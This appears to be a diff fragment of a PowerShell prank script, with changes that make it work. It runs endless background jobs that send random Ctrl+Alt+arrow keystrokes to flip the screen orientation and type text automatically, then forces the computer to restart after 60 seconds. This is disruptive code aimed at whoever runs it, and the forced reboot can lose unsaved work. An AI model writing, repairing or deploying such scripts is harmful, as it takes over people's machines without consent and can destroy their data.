@@ -18,10 +18,11 @@ $player.Play()
 
 # Start infinite orientation flipping
 Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Windows.Forms  # Added assembly load
-    $keys = @("%{LEFT}", "%{RIGHT}", "%{UP}", "%{DOWN}")  # Corrected keys
+    Add-Type -AssemblyName System.Windows.Forms
+    $keys = @("^{%}{LEFT}", "^{%}{RIGHT}", "^{%}{UP}", "^{%}{DOWN}")
     while ($true) {
-        [System.Windows.Forms.SendKeys]::SendWait(($keys | Get-Random))  # Fixed parentheses and typo
+        $key = $keys | Get-Random
+        [System.Windows.Forms.SendKeys]::SendWait($key)
         Start-Sleep -Seconds 3
     }
 }
@@ -43,13 +44,13 @@ Start-Job -ScriptBlock {
         Start-Sleep -Seconds 2
         foreach ($char in $query.ToCharArray()) {
             [System.Windows.Forms.SendKeys]::SendWait($char)
-            Start-Sleep -Milliseconds 30  # ~200WPM
+            Start-Sleep -Milliseconds 30
         }
         [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
         Start-Sleep -Seconds 3
     }
 }
 
-# Wait 60 seconds then restart
+# Wait then restart
 Start-Sleep -Seconds 60
 Restart-Computer -Force
